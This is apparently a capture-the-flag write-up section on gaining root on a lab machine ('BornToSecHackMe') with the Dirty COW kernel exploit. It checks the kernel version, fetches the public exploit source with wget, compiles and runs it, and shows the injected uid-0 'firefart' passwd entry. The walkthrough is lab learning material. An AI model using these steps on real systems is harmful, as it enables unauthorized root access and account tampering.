## DIRTY COW

This method consists of using the dirty cow exploit (CVE-2016-5195) which is a privilege escalation vulnerability in the Linux Kernel based on a race condition, we can see [here](https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions) that it was patched ubuntu 12.04 in kernel version 3.2.0-113.155 and above.

```console
laurie@BornToSecHackMe:~$ uname -r
3.2.0-91-generic-pae
```

since our kernel version is older that means it should work for us. This exploit uses a race condition to let us write into any file even with no permissions, we can do privilege escalation here by adding a user with uid of 0 so it has all the root permission and then we log with the newly created user.
*firefart:figsoZwws4Zu6:0:0:pwned:/root:/bin/bash*

First, let's get the exploit code from github using wget (we will use the firefart version):

```console
laurie@BornToSecHackMe:~$ wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
```

then we compile the c file the execute it

```console
laurie@BornToSecHackMe:~$ gcc -pthread dirty.c -o dirty -lcrypt
laurie@BornToSecHackMe:~$ ./dirty
```

voila, now we can log in the firefart using su firefart and we'll get all root permissions